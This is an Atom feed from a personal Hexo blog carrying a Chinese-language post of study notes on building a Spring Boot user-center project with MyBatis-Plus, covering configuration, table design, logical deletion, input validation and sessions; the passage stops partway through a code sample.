<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>幻境</title>
  
  <subtitle>yub_s blog</subtitle>
  <link href="https://yubut.github.io/atom.xml" rel="self"/>
  
  <link href="https://yubut.github.io/"/>
  <updated>2025-01-20T14:50:12.348Z</updated>
  <id>https://yubut.github.io/</id>
  
  <author>
    <name>yub</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>UserCenter项目疑问记录</title>
    <link href="https://yubut.github.io/2025/01/20/UserCenter%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/"/>
    <id>https://yubut.github.io/2025/01/20/UserCenter%E9%A1%B9%E7%9B%AE%E7%96%91%E9%97%AE%E8%AE%B0%E5%BD%95/</id>
    <published>2025-01-20T14:46:20.000Z</published>
    <updated>2025-01-20T14:50:12.348Z</updated>
    
    <content type="html"><![CDATA[<h3 id="UserCenter-项目疑问记录"><a href="#UserCenter-项目疑问记录" class="headerlink" title="UserCenter 项目疑问记录"></a>UserCenter 项目疑问记录</h3><p>如何进行企业级开发?其实不管做什么都需要事先做好规划.项目要实现的功能是什么，要怎么实现，做一个具体规划（预估时间），先完成框架搭建再去细化.</p><h4 id="项目完整开发流程"><a href="#项目完整开发流程" class="headerlink" title="项目完整开发流程"></a>项目完整开发流程</h4><ul><li>需求分析</li><li>设计（概要设计、详细设计）</li><li>技术选型（前端&#x2F;后端）</li><li>初始化（前端&#x2F;后端），引入需要的技术</li><li>搭建框架（Demo）【引入框架后可依据需求瘦身】</li><li>实现业务逻辑</li><li>测试（单元测试）</li><li>代码提交&#x2F;代码评审</li><li>部署</li><li>发布</li></ul><p><strong>Tips</strong></p><ol><li>框架瘦身阶段，每次删除一个文件都要重启项目是否能运行.</li><li>多查看官方文档.</li><li>养成好习惯，数据库相关操作语句做好本地或云端备份.</li></ol><p><strong>需要掌握的基本知识</strong></p><p>controller：只需接收请求，不做任何业务处理.倾向对请求参数本身的校验，较少涉及业务逻辑校验.<br>service: 业务逻辑处理（校验）有可能被contoller之外的类调用<br>mapper（dao）：数据访问层<br>model：数据封装类<br>utils：工具类（比如加密，日期转换，日期转换）<br>Lombook：帮助生成小的Java类实体对象</p><h4 id="Spring-Boot框架整合"><a href="#Spring-Boot框架整合" class="headerlink" title="Spring Boot框架整合"></a>Spring Boot框架整合</h4><ol><li><p>创建数据库</p><p><img src="/../imgs/2025-01/image-20250119104243355.png" alt="image-20250119104243355"></p></li><li><p>建表<br><img src="/../imgs/2025-01/image-20250119104354791.png" alt="image-20250119104354791"></p></li><li><p>引入需要的依赖，比如Junit4（Maven Repository）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">&lt;!-- JUnit --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>4.配置yml文件.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user-center</span></span><br><span class="line">    <span class="comment"># DataSource Config</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/yourdatabase</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">yourname</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">yourpwd</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><h4 id="Mybatis-plus"><a href="#Mybatis-plus" class="headerlink" title="Mybatis-plus"></a>Mybatis-plus</h4><p>新接触的技术文档学会去官网逐步学习.</p><h4 id="Resource和Autowired区别"><a href="#Resource和Autowired区别" class="headerlink" title="Resource和Autowired区别"></a>Resource和Autowired区别</h4><p>Resouce默认按照Bean对象名称进行注入，如果无法通过名称匹配则会按照类型注入.只能在Spring容器中使用.<br>Autowired默认按照类型注入如果有多个符合条件的Bean（多于一个匹配类型）可以结合@Qualifier注解按名称指定.</p><table><thead><tr><th>属性</th><th><code>@Resource</code></th><th><code>@Autowired</code></th></tr></thead><tbody><tr><td><strong><code>name</code></strong></td><td>支持，按名称注入</td><td>不支持</td></tr><tr><td><strong><code>type</code></strong></td><td>支持，按类型注入</td><td>不支持</td></tr><tr><td><strong><code>required</code></strong></td><td>不支持</td><td>支持，默认 <code>required=true</code>，可设置为 <code>false</code></td></tr></tbody></table><p><strong>推荐使用Resource</strong>.</p><h4 id="Runwith注解"><a href="#Runwith注解" class="headerlink" title="@Runwith注解"></a>@Runwith注解</h4><p><img src="/../imgs/2025-01/image-20250113211506790.png" alt="image-20250113211506790"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br></pre></td></tr></table></figure><p>使用@Runwith注解可解决注入对象为NULL问题</p><h4 id="Mapper和-MapperScan"><a href="#Mapper和-MapperScan" class="headerlink" title="@Mapper和@MapperScan"></a>@Mapper和@MapperScan</h4><p><img src="/../imgs/2025-01/image-20250113211801210.png" alt="image-20250113211801210"></p><p>主配置文件中使用@MapperScan注解等价于在mapper接口（scan扫描定义的路径就是包含扫描到mapper包下所有内容）</p><p><img src="/../imgs/2025-01/image-20250113211842054.png" alt="image-20250113211842054"></p><p><strong>当然前提都要保证配置文件【pom.xml没问题】</strong></p><table><thead><tr><th><strong>Spring Boot 版本</strong></th><th><strong>MyBatis-Plus 版本</strong></th><th><strong>MyBatis 版本</strong></th><th><strong>MySQL 驱动版本</strong></th><th><strong>MySQL 数据库版本</strong></th></tr></thead><tbody><tr><td>3.1.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.33 - 8.0.34</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>3.0.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.33 - 8.0.34</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.7.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.30 - 8.0.33</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.6.x</td><td>3.4.x - 3.5.x</td><td>3.4.x - 3.5.x</td><td>8.0.28 - 8.0.33</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.5.x</td><td>3.4.x</td><td>3.4.x</td><td>8.0.28 - 8.0.31</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.4.x</td><td>3.4.x</td><td>3.4.x</td><td>8.0.26 - 8.0.29</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.3.x</td><td>3.3.x</td><td>3.3.x</td><td>8.0.22 - 8.0.27</td><td>5.7.x &#x2F; 8.0.x</td></tr></tbody></table><p><strong>注意拉下来框架之后自己配置好MySQL对应依赖的content</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.6.13<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.5.9<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mysql-connector.version</span>&gt;</span>8.0.33<span class="tag">&lt;/<span class="name">mysql-connector.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数据表设计"><a href="#数据表设计" class="headerlink" title="数据表设计"></a>数据表设计</h4><table><thead><tr><th>特性</th><th><code>CHAR</code></th><th><code>VARCHAR</code></th></tr></thead><tbody><tr><td><strong>长度</strong></td><td>固定长度，无论实际内容多少</td><td>可变长度，仅存储实际内容</td></tr><tr><td><strong>存储空间</strong></td><td>占用固定空间，可能浪费存储</td><td>更节省空间，但有额外长度信息开销</td></tr><tr><td><strong>性能</strong></td><td>定长，性能更高</td><td>可变长度，性能略低</td></tr><tr><td><strong>适用场景</strong></td><td>长度固定的数据（如身份证号）</td><td>长度可变的数据（如用户名）</td></tr><tr><td><strong>尾部空格处理</strong></td><td>存储时补足空格，查询时忽略</td><td>存储时不 补足空格，查询时需精确匹配</td></tr><tr><td><strong>最大长度</strong></td><td>255 字符</td><td>65535 字节</td></tr></tbody></table><p>多留余地万一以后要修改 <strong>varchar！</strong></p><table><thead><tr><th>特性</th><th><code>INT</code></th><th><code>TINYINT</code></th></tr></thead><tbody><tr><td><strong>存储空间</strong></td><td>4 字节</td><td>1 字节</td></tr><tr><td><strong>取值范围（有符号）</strong></td><td>-2,147,483,648 ~ 2,147,483,647</td><td>-128 ~ 127</td></tr><tr><td><strong>取值范围（无符号）</strong></td><td>0 ~ 4,294,967,295</td><td>0 ~ 255</td></tr><tr><td><strong>适用场景</strong></td><td>大范围数据（如主键、自增 ID）</td><td>小范围数据（如状态、布尔值）</td></tr><tr><td><strong>性能</strong></td><td>处理速度略低，存储空间更大</td><td>存储效率高，适合小范围高效存储</td></tr></tbody></table><p>可以多使用tinyint 避免浪费空间.</p><p><strong>什么时候需要索引</strong></p><table><thead><tr><th><strong>场景</strong></th><th><strong>是否设计索引</strong></th></tr></thead><tbody><tr><td>高频查询的列</td><td>✅ 需要</td></tr><tr><td>作为主键或唯一性约束的列</td><td>✅ 需要</td></tr><tr><td>经常排序、分组的列</td><td>✅ 需要</td></tr><tr><td>大表中的查询条件列</td><td>✅ 需要</td></tr><tr><td>小表、数据量很少的表</td><td>❌ 不需要</td></tr><tr><td>写操作非常频繁的表</td><td>❌ 避免过多索引</td></tr><tr><td>低选择性的列（重复值较多）</td><td>❌ 一般不需要</td></tr><tr><td>从不在查询条件中出现的列</td><td>❌ 不需要</td></tr></tbody></table><p>在实际设计中，应结合业务需求和数据分布情况，合理设计索引以平衡性能与存储开销。</p><h4 id="DELETE-与-TRUNCATE-的差异总结"><a href="#DELETE-与-TRUNCATE-的差异总结" class="headerlink" title="DELETE 与 TRUNCATE 的差异总结"></a>DELETE 与 TRUNCATE 的差异总结</h4><table><thead><tr><th><strong>特性</strong></th><th><strong>DELETE</strong></th><th><strong>TRUNCATE</strong></th></tr></thead><tbody><tr><td><strong>类型</strong></td><td>DML（数据操作语言）</td><td>DDL（数据定义语言）</td></tr><tr><td><strong>作用范围</strong></td><td>可以带 <code>WHERE</code> 条件，删除部分或全部数据</td><td>删除表中所有数据，无法带条件</td></tr><tr><td><strong>触发器</strong></td><td>会触发触发器</td><td>不会触发触发器</td></tr><tr><td><strong>日志记录</strong></td><td>逐行记录删除操作，记录到事务日志中</td><td>不逐行记录，操作速度快</td></tr><tr><td><strong>事务支持</strong></td><td>支持事务，可以回滚</td><td>大多数数据库中不支持事务，操作不可回滚</td></tr><tr><td><strong>性能</strong></td><td>慢，逐行删除，记录日志</td><td>快，直接清空表</td></tr><tr><td><strong>表结构</strong></td><td>表结构、列、索引保留</td><td>表结构、列、索引保留</td></tr><tr><td><strong>AUTO_INCREMENT 重置</strong></td><td>不会重置 AUTO_INCREMENT</td><td>会重置 AUTO_INCREMENT</td></tr><tr><td><strong>使用场景</strong></td><td>删除部分数据或在事务中操作</td><td>清空表中所有数据，高效快速地删除大批量数据</td></tr></tbody></table><p>id由数据库分配-&gt;auto</p><p><img src="/../imgs/2025-01/image-20250113222854939.png" alt="image-20250113222854939"></p><h4 id="自动生成器使用"><a href="#自动生成器使用" class="headerlink" title="自动生成器使用"></a>自动生成器使用</h4><p>MybatisX插件自动根据数据库生成domain实体对象、mapper（操作数据库的对象）、mapper.xml（定义了mapper对象和数据库的关联，可以在其中写自己的SQL）、service（包含常用的增删改查）、serviceImpl（实现具体service）</p><p>使用Mybatisx插件自动生成需要的类【右键表名】</p><p><img src="/../imgs/2025-01/image-20250114124902816.png" alt="image-20250114124902816"></p><p><img src="/../imgs/2025-01/image-20250114125026113.png" alt="image-20250114125026113"></p><p>根据Mybatisplus和Mybatis框架机制 会自动帮我们生成需要的Id（用户新增的ID会把塞到user表中）<br><img src="/../imgs/2025-01/image-20250114131948027.png" alt="image-20250114131948027"></p><h4 id="Mybatis-Plus默认转换机制"><a href="#Mybatis-Plus默认转换机制" class="headerlink" title="Mybatis-Plus默认转换机制"></a>Mybatis-Plus默认转换机制</h4><p>写了service的Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.service;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.model.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Assertions;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用户服务测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tesAddUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line">        user.setUserAccount(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        user.setAvatarUrl(<span class="string">&quot;https://tse3-mm.cn.bing.net/th/id/OIP-C.4RGfXFhVnIgc2CyGw-I9XAAAAA?w=208&amp;h=208&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.3&amp;pid=1.7&quot;</span>);</span><br><span class="line">        user.setGender(<span class="number">1</span>);</span><br><span class="line">        user.setUserPassword(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        user.setPhone(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        user.setEmail(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> userService.save(user);</span><br><span class="line">        System.out.println(user.getId());</span><br><span class="line">        Assertions.assertTrue(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现报错 查看官方文档<br><img src="/../imgs/2025-01/image-20250114132807433.png" alt="image-20250114132807433"></p><h3 id="mapUnderscoreToCamelCase"><a href="#mapUnderscoreToCamelCase" class="headerlink" title="mapUnderscoreToCamelCase"></a>mapUnderscoreToCamelCase</h3><ul><li><strong>类型</strong>：<code>boolean</code></li><li><strong>默认值</strong>：<code>true</code></li></ul><p>开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射。</p><p><strong>配置示例</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mybatis-plus:</span><br><span class="line">  configuration:</span><br><span class="line">    map-underscore-to-camel-case: true</span><br></pre></td></tr></table></figure><p><strong>提示</strong></p><p>在 MyBatis-Plus 中，此属性也将用于生成最终的 SQL 的 select body。如果您的数据库命名符合规则，无需使用 <code>@TableField</code> 注解指定数据库字段名。</p><h4 id="Mybatis-Plus默认删除机制"><a href="#Mybatis-Plus默认删除机制" class="headerlink" title="Mybatis-Plus默认删除机制"></a>Mybatis-Plus默认删除机制</h4><p>MyBatis-Plus 的逻辑删除功能会在执行数据库操作时自动处理逻辑删除字段。以下是它的工作方式：</p><ul><li><strong>插入</strong>：逻辑删除字段的值不受限制。</li><li><strong>查找</strong>：自动添加条件，过滤掉标记为已删除的记录。</li><li><strong>更新</strong>：防止更新已删除的记录。</li><li><strong>删除</strong>：将删除操作转换为更新操作，标记记录为已删除。</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="步骤-1-配置全局逻辑删除属性"><a href="#步骤-1-配置全局逻辑删除属性" class="headerlink" title="步骤 1: 配置全局逻辑删除属性"></a>步骤 1: 配置全局逻辑删除属性</h3><p>在 <code>application.yml</code> 中配置 MyBatis-Plus 的全局逻辑删除属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mybatis-plus:</span><br><span class="line">  global-config:</span><br><span class="line">    db-config:</span><br><span class="line">      logic-delete-field: deleted # 全局逻辑删除字段名</span><br><span class="line">      logic-delete-value: 1 # 逻辑已删除值</span><br><span class="line">      logic-not-delete-value: 0 # 逻辑未删除值</span><br></pre></td></tr></table></figure><h3 id="步骤-2-在实体类中使用-TableLogic-注解"><a href="#步骤-2-在实体类中使用-TableLogic-注解" class="headerlink" title="步骤 2: 在实体类中使用 @TableLogic 注解"></a>步骤 2: 在实体类中使用 <code>@TableLogic</code> 注解</h3><p>在实体类中，对应数据库表的逻辑删除字段上添加 <code>@TableLogic</code> 注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableLogic;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;    <span class="comment">// 其他字段...</span></span><br><span class="line">    <span class="meta">@TableLogic</span>    <span class="keyword">private</span> Integer deleted;&#125;</span><br></pre></td></tr></table></figure><p><strong>复杂重复的校验使用工具Apache Commons Lang</strong><br><img src="/../imgs/2025-01/image-20250114135218842.png" alt="image-20250114135218842"></p><p><strong>用于校验用户账号是否出现特殊字符的正则表达式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//匹配 标点符号 (\pP)、符号字符 (\pS) 或 一个或多个空白字符 (\s+)。</span></span><br><span class="line"><span class="string">&quot;\\pP|\\pS|\\s+&quot;</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ol><li><code>&quot;\\pP|\\pS|\\s+&quot;</code> 使用 Unicode 属性匹配字符，比 <code>[^a-zA-Z0-9_]</code> 更加精准和丰富。</li><li>如果需要明确匹配标点符号、符号字符和空白，可以使用 <code>&quot;\\pP|\\pS|\\s+&quot;</code>。</li><li>如果只需要简单排除非法字符（不属于某些范围的字符），可以使用 <code>[^a-zA-Z0-9_]</code>。</li></ol><h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a><strong>自动装箱和拆箱</strong></h4><table><thead><tr><th><strong>特性</strong></th><th><strong>自动装箱</strong></th><th><strong>自动拆箱</strong></th></tr></thead><tbody><tr><td><strong>方向</strong></td><td>基本数据类型 → 包装类</td><td>包装类 → 基本数据类型</td></tr><tr><td><strong>触发场景</strong></td><td>需要对象时，例如赋值给包装类变量或添加到集合中</td><td>需要基本类型时，例如参与运算或赋值给基本类型变量</td></tr><tr><td><strong>主要方法实现</strong></td><td>调用包装类的 <code>valueOf()</code> 方法</td><td>调用包装类的 <code>xxxValue()</code> 方法（如 <code>intValue()</code>）</td></tr><tr><td><strong>示例代码</strong></td><td><code>Integer integer = 10;</code> &#x2F;&#x2F; 等价于 <code>Integer.valueOf(10)</code></td><td><code>int value = integer;</code> &#x2F;&#x2F; 等价于 <code>integer.intValue()</code></td></tr><tr><td><strong>作用</strong></td><td>将基本数据类型变为对象，用于集合或对象需求场景</td><td>将对象转为基本类型，用于计算或基本类型需求场景</td></tr><tr><td><strong>注意点</strong></td><td>频繁装箱会有性能开销，可能导致产生大量对象</td><td>包装类是 <code>null</code> 时，会引发 <code>NullPointerException</code></td></tr><tr><td><strong>集合框架操作</strong></td><td><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</code></td><td><code>int value = list.get(0);</code></td></tr><tr><td><strong>对象赋值</strong></td><td><code>Integer integer = 10;</code></td><td><code>int num = integer;</code></td></tr><tr><td><strong>算术运算</strong></td><td><code>Integer a = 5; Integer b = 10; Integer sum = a + b;</code></td><td>在运算时，<code>a</code> 和 <code>b</code>会拆箱为 <code>int</code> 类型并执行计算</td></tr><tr><td><strong>方法调用</strong></td><td>传递基本类型参数，包装类参数会自动装箱</td><td>方法返回包装类对象，接收者为基本类型会自动拆箱</td></tr></tbody></table><p><img src="/../imgs/2025-01/image-20250114163625145.png" alt="image-20250114163625145"></p><p><img src="/../imgs/2025-01/image-20250114165428279.png" alt="image-20250114165428279"></p><p><strong>小Tip</strong><br>使用mapper注入思路更清晰，但功能不如直接使用ServiceImp继承全面.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//账号不能重复</span></span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;userAccount&quot;</span>, userAccount);</span><br><span class="line">        <span class="comment">//这里的this其实就是UserServiceImpl拥有继承的父类的所有可继承的方法</span></span><br><span class="line">        <span class="comment">// long count = this.count(queryWrapper); </span></span><br><span class="line">       <span class="comment">//上一行是直接使用继承的父类的功能的等价于使用Usermapper注入</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> userMapper.selectCount(queryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>请求参数很长的时候不建议用get【限流 获取IP 同一个IP登录过多次 封号】<br>校验 存储<br>使用JSON格式的话最好封装一个对象 单独储存参数<br><img src="/../imgs/2025-01/image-20250115110534408.png" alt="image-20250115110534408"></p><p>大体积对象变成小体积（使用序列化），节省数据传输时间</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>编写测试样例时，安装GenerateAllSetter插件可以快速生成默认值代码.<br><img src="/../imgs/2025-01/image-20250120220908304.png" alt="image-20250120220908304"></p><h4 id="IDEA自带的测试工具"><a href="#IDEA自带的测试工具" class="headerlink" title="IDEA自带的测试工具"></a>IDEA自带的测试工具</h4><p><img src="/../imgs/2025-01/image-20250115115048677.png" alt="image-20250115115048677"></p><p><img src="/../imgs/2025-01/image-20250115115322123.png" alt="image-20250115115322123"></p><h4 id="session一天失效"><a href="#session一天失效" class="headerlink" title="session一天失效"></a>session一天失效</h4><table><thead><tr><th>特性</th><th>Session</th><th>Cookie</th></tr></thead><tbody><tr><td><strong>存储位置</strong></td><td>数据存储在服务器端，客户端只保存Session ID</td><td>数据存储在客户端浏览器中</td></tr><tr><td><strong>生命周期</strong></td><td>通常与会话相关，浏览器关闭或超时后失效</td><td>可以设置过期时间，也可以是会话级的</td></tr><tr><td><strong>安全性</strong></td><td>更安全，因为数据保存在服务器端，不易被篡改</td><td>较不安全，易受攻击（如XSS、劫持等），敏感信息不宜存储</td></tr><tr><td><strong>数据类型</strong></td><td>可以存储复杂的数据结构</td><td>只能存储字符串类型的数据</td></tr><tr><td><strong>传输数据量</strong></td><td>只传输Session ID，传输量小，性能较高</td><td>传输全部数据，可能增加网络开销</td></tr><tr><td><strong>服务器负担</strong></td><td>需要服务器资源来存储Session数据</td><td>不占用服务器资源，减轻服务器负担</td></tr><tr><td><strong>适用场景</strong></td><td>适用于需要处理敏感信息或复杂数据的场景</td><td>适用于存储客户端简单数据（如用户偏好）或跟踪用户行为</td></tr></tbody></table><p>在application.yml文件下配置session</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user-center</span></span><br><span class="line">    <span class="comment"># DataSource Config</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/yourdatabase</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">yourname</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">yourpwd</span></span><br><span class="line">  <span class="attr">session:</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">86400</span></span><br></pre></td></tr></table></figure><p>通用类型data，使用泛型.不管接口返回的内容类型是什么都可以兼容.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 